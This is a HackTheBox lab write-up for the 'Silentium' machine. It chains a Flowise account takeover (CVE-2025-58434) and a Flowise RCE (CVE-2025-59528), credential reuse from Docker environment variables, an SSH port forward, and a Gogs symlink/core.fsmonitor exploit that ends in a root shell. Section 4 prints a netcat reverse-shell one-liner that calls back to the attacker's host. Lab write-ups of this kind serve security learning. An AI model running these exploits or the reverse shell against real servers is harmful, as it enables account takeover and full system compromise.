# Silentium — HackTheBox Writeup

**Platform:** HackTheBox  
**Difficulty:** Medium  
**OS:** Linux  
**Tags:** CVE-2025-58434, Flowise Account Takeover, CVE-2025-59528, Flowise RCE, Docker, Port Forwarding, Gogs RCE

---

## Attack Chain

1. Nmap → ports 22 (SSH) and 80 (HTTP / nginx)
2. ffuf VHost enum → `staging.silentium.htb` → Flowise 3.0.5
3. CVE-2025-58434 → unauthenticated account takeover → admin access as `ben@silentium.htb`
4. CVE-2025-59528 → authenticated RCE via customMCP node → shell inside Docker container
5. Docker `env` → leaked `FLOWISE_PASSWORD` → SSH in as `ben`
6. `ss -tlnp` → internal Gogs on port 3001 → SSH local port forward
7. Register Gogs account → generate API token → symlink RCE exploit → root shell

---

## 1. Enumeration

```
nmap -sV -sC -p- -Pn 10.129.52.140

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
```

Port 80 is a static corporate landing page. Directory brute-forcing returns nothing. Move to VHost enumeration.

---

## 2. VHost Discovery

```bash
ffuf -u http://silentium.htb \
  -H 'Host: FUZZ.silentium.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac

staging   [Status: 200, Size: 3142]
```

Add `staging.silentium.htb` to `/etc/hosts`. Browsing to it presents a **Flowise** login panel.

Confirm the version via the unauthenticated version endpoint:

```bash
curl -s http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}
```

Flowise 3.0.5 is vulnerable to:
- **CVE-2025-58434** — unauthenticated account takeover via password reset token leak
- **CVE-2025-59528** — authenticated RCE via the customMCP node endpoint

---

## 3. Flowise Account Takeover — CVE-2025-58434

CVE-2025-58434 allows an unauthenticated attacker to trigger a password reset for any account and read the temporary token directly from the API response — no email access required.

```bash
python3 exploit.py -t http://staging.silentium.htb \
  -e ben@silentium.htb

[+] Target appears to be vulnerable.
[*] Starting Account Takeover (CVE-2025-58434)...
[+] Password reset request sent successfully.

 ➜  ID     : e26c9d6c-678c-4c10-9e36-01813e8fea73
 ➜  Name   : admin
 ➜  Email  : ben@silentium.htb
 ➜  Status : active

[+] Account takeover successful!
```

Admin access to Flowise confirmed. Generate an API key from the dashboard for the next stage.

---

## 4. Flowise RCE — CVE-2025-59528

CVE-2025-59528 is an authenticated RCE in Flowise. The `/api/v1/node-load-method/customMCP` endpoint evaluates attacker-controlled input server-side, allowing arbitrary command execution.

The exploit chains account takeover directly into a reverse shell using `full-mode`:

```bash
python3 exploit.py -t http://staging.silentium.htb \
  -e ben@silentium.htb \
  --lhost YOUR_IP \
  --lport 4444 \
  full-mode

[+] Account takeover successful!
[+] Login successful!
[*] Starting Remote Code Execution (CVE-2025-59528)...
[*] Reverse shell command: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 >/tmp/f
[*] Target URL: http://staging.silentium.htb/api/v1/node-load-method/customMCP
[+] Payload sent. Check your listener for a reverse shell connection!
```

Shell lands inside a **Docker container** as root. Enumerate environment variables:

```
HOSTNAME=c78c3cceb7ba
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=[redacted]
SENDER_EMAIL=ben@silentium.htb
SMTP_HOST=mailhog
```

`FLOWISE_PASSWORD` is set — likely reused for the `ben` OS account.

---

## 5. SSH Foothold as ben

```bash
ssh ben@10.129.57.226
# password: FLOWISE_PASSWORD value from Docker env

ben@silentium:~$ whoami
ben
ben@silentium:~$ cat user.txt
[redacted]
```

`sudo -l` gives nothing for ben. Check listening services:

```bash
ben@silentium:~$ ss -tlnp

LISTEN  127.0.0.1:3001   # internal service
LISTEN  127.0.0.1:3000
LISTEN  127.0.0.1:1025
LISTEN    0.0.0.0:80
LISTEN    0.0.0.0:22
```

Port 3001 is internal only. Forward it locally:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.57.226
```

Browsing to `http://127.0.0.1:3001` reveals a **Gogs** self-hosted git service.

---

## 6. Gogs — Symlink RCE

Register an account on the Gogs instance and generate an API access token from user settings.

The exploit pushes a malicious symlink into a git repository then uses the Gogs API to overwrite the repo's `.git/config`. Injecting a `core.fsmonitor` hook value into the config triggers code execution when a git operation runs server-side — Gogs is running as root.

```bash
python3 exploit.py \
  --url http://127.0.0.1:3001 \
  --username <your-user> \
  --password <your-password> \
  --token <your-api-token> \
  --host YOUR_IP \
  --port 4444

[+] Repo created: 1e355eeb17b6
[*] Cloning repo as <your-user>...
[master 68e12d0] Initial commit — malicious_link (symlink)
[+] Symlink successfully pushed to master.
[*] Overwriting .git/config via symlink API...
```

Listener catches a shell as **root**:

```bash
nc -lvnp 4444

root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# whoami
root

root@silentium:~# cat /root/root.txt
[redacted]
```

---

## 7. Flags

```
User : /home/ben/user.txt  → redacted
Root : /root/root.txt      → redacted
```

---

> ⚠️ For educational purposes only. Only test systems you own or have explicit written permission to test.
